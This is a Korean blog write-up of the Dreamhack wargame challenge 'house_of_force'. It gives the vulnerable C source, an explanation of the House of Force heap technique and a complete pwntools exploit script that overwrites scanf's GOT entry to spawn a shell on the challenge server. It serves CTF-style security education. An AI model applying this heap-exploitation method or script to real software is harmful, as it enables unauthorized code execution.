---
title: "house_of_force writeup"
date: 2026-04-06 04:47:00 +0900
categories: [Wargame, Dreamhack]
tags: [pwn, heap, house-of-force, got-overwrite, dreamhack]
---

## Analysis

### checksec
```
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

No PIE, Partial RELRO이므로 GOT overwrite가 가능하다. 32비트 바이너리이다.

### Source Code
```c
// gcc -o force force.c -m32 -mpreferred-stack-boundary=2
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

int *ptr[10];

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int create(int cnt) {
	int size;

	if( cnt > 10 ) {
		return 0;
	}

	printf("Size: ");
	scanf("%d", &size);

	ptr[cnt] = malloc(size);

	if(!ptr[cnt]) {
		return -1;
	}

	printf("Data: ");
	read(0, ptr[cnt], size);

	printf("%p: %s\n", ptr[cnt], ptr[cnt]);
	return 0;
}

int write_ptr() {
	int idx;
	int w_idx;
	unsigned int value;

	printf("ptr idx: ");
	scanf("%d", &idx);

	if(idx > 10 || idx < 0) {
		return -1;
	} 

	printf("write idx: ");
	scanf("%d", &w_idx);

	if(w_idx > 100 || w_idx < 0) {
		return -1;
	}
	printf("value: ");
	scanf("%u", &value);

	ptr[idx][w_idx] = value;

	return 0;
}

void get_shell() {
	system("/bin/sh");
}

int main() {
	int idx;
	int cnt = 0;
	int w_cnt = 0;
	initialize();

	while(1) {
		printf("1. Create\n");
		printf("2. Write\n");
		printf("3. Exit\n");
		printf("> ");

		scanf("%d", &idx);

		switch(idx) {
			case 1:
				create(cnt++);
				cnt++;
				break;
			case 2:
				if(w_cnt) {
					return -1;
				}
				write_ptr();
				w_cnt++;
				break;
			case 3:
				exit(0);
			default:
				break;
		}
	}

	return 0;
}
```

## Vulnerability Analysis

`create()`는 입력받은 `size`만큼 `malloc`하고 추가로 데이터도 입력받는다. 이후 할당한 청크 주소와 입력 데이터를 출력한다. `write_ptr()`에는 OOB 취약점이 있다. 1번만 호출할 수 있으며, `create()`로 할당한 청크 시작 주소 기준으로 4바이트 단위 100칸까지 임의 쓰기가 가능하다.

원하는 `size`로 `malloc`할 수 있고 할당한 청크의 주소를 출력해 주니 `top_chunk`의 주소도 바로 알 수 있다. OOB 취약점도 있으니 `top_chunk`의 size도 마음껏 조작할 수 있다. House of Force 기법을 사용하기 위한 모든 조건을 만족하고 있다. `get_shell` 함수가 주어졌고 No PIE, Partial RELRO이므로 GOT overwrite로 실행 흐름을 조작할 수 있다.

## Exploit

GOT를 확인해보면
```
pwndbg> got

/pwn/house_of_force/house_of_force:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ffc R_386_GLOB_DAT    __gmon_start__
0804a060 R_386_COPY        stdin@GLIBC_2.0
0804a064 R_386_COPY        stdout@GLIBC_2.0
0804a00c R_386_JUMP_SLOT   read@GLIBC_2.0
0804a010 R_386_JUMP_SLOT   printf@GLIBC_2.0
0804a014 R_386_JUMP_SLOT   signal@GLIBC_2.0
0804a018 R_386_JUMP_SLOT   alarm@GLIBC_2.0
0804a01c R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
0804a020 R_386_JUMP_SLOT   malloc@GLIBC_2.0
0804a024 R_386_JUMP_SLOT   puts@GLIBC_2.0
0804a028 R_386_JUMP_SLOT   system@GLIBC_2.0
0804a02c R_386_JUMP_SLOT   exit@GLIBC_2.0
0804a030 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804a034 R_386_JUMP_SLOT   setvbuf@GLIBC_2.0
0804a038 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
```

`scanf`가 8바이트 배수 주소이고, 이전 엔트리인 `setvbuf`도 쓰레기 값으로 덮여도 상관없기 때문에 덮어쓰기에 가장 적절한 위치이다. 32비트 ptmalloc2에서 청크들은 8바이트로 정렬되므로 목표 주소가 8바이트의 배수여야 정확히 도달할 수 있다. 8바이트 배수가 아닐 경우, 8바이트 배수인 이전 엔트리부터 시작해야 한다. 이를 위해서는 이전 엔트리 주소가 쓰레기 값으로 덮여도 무방하거나, 그렇지 않다면 libc base를 구해서 알아내든 기존 GOT 값을 출력하든 하여 기존 값을 유지하도록 덮거나, `plt + 6`으로 덮어서 동적 링커에게 다시 지연 바인딩시켜야 한다.

이제 모든 조건이 정해졌으니 익스플로잇을 수행할 수 있다. 처리 순서는 다음과 같다.

1. `create()`에서 청크를 하나 할당하여 출력된 청크 주소를 기반으로 `top_chunk`의 주소를 알아낸다.
2. `write_ptr()`의 OOB 취약점을 이용해, 1에서 할당한 청크를 기반으로 `top_chunk`의 size 헤더 값을 `2^32-1`로 덮는다. 이로 인해 `malloc`은 이 범위 내의 청크 할당 요청을 모두 `top_chunk`로 처리하게 된다.
3. 다시 `create()`에서 할당 사이즈를 `목표 주소 - top_chunk 주소 - 16`으로 하여 `malloc`을 호출한다. `-16`을 하는 이유는 다음과 같다. `malloc`은 실제 할당 크기를 요청 사이즈에 헤더 크기(여기서는 4바이트)를 더해 계산하는데, 목표 주소와 `top_chunk` 주소의 차이가 8바이트 정렬되어 있으므로 4바이트를 더하면 8바이트 정렬을 맞추기 위해 총 8바이트가 추가된다. 따라서 8바이트를 빼서 요청해야 목표 주소를 넘지 않는다. 나머지 8바이트는 청크 주소 기준으로 앞 8바이트가 헤더 영역이므로, 페이로드와 목표 주소가 맞닿게 하려면 추가로 8바이트를 더 빼야 한다.
4. 3번 과정을 마치면 `top_chunk`는 `목표 주소 - 8`을 가리키고 있다. 이제 다시 `create()`으로 동적 할당한 후 `get_shell` 주소를 데이터로 입력하면 `scanf`의 GOT가 덮어진다.

아래는 전체 익스플로잇 코드이다.
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./house_of_force")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 9362)

    return r


def main():
    r = conn()

    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Size: ", b"4")
    r.sendafter(b"Data: ", b"AAAA")
    leak = r.recvuntil(b":")[:-1]
    
    top_chunk = int(leak, 16) + 8
    scanf_got = exe.got["__isoc99_scanf"]

    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"ptr idx: ", b"0")
    r.sendlineafter(b"write idx: ", b"3")
    r.sendlineafter(b"value: ", b"-1")

    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Size: ", str(scanf_got - top_chunk - 16).encode())
    r.sendafter(b"Data: ", b"AAAA")
    
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Size: ", b"4")
    r.sendafter(b"Data: ", p32(exe.symbols["get_shell"]))

    r.interactive()


if __name__ == "__main__":
    main()
```